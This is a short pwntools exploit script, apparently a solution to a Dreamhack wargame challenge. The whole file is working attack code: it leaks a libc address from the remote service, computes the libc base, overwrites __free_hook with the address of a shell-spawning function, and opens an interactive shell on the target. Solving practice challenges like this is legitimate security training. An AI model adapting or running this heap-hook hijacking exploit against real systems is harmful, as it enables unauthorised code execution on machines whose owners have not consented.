#!/usr/bin/env python2

from pwn import *
import re

#HOST = "127.0.0.1"
#PORT = 12345

HOST = "host1.dreamhack.games"
PORT = 10438

libc = ELF("./libc.so.6")
conn = remote(HOST, PORT)

shell = 0x0000000000400A11
libc_stdout = 0x00000000003C5620
libc_free_hook = 0x00000000003C67A8
libc_base = int(re.search("0[xX][0-9a-fA-F]+", conn.recv()).group(), 16) - libc_stdout

conn.sendline("40")

payload = p64(libc_base+libc_free_hook)
payload += p64(shell)
conn.sendline(payload)
conn.interactive()
